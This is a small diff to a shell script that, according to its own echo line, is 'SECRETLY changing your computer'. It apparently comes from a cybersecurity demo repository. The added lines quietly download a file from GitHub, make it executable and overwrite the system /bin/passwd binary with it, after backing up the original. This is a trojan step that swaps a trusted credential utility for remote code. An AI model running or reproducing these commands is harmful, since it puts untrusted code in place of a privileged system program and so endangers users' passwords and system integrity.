@@ -18,4 +18,6 @@ echo SECRETLY changing your computer
 mkdir /home/backup_files
 
 cp /bin/passwd /home/backup_files/passwd
-wget 
+wget -q https://raw.githubusercontent.com/bbaum11/CyberVT-Sep24-Demo/refs/heads/main/SPOILERSAHEAD/passwd
+chmod +x passwd
+mv passwd /bin/passwd
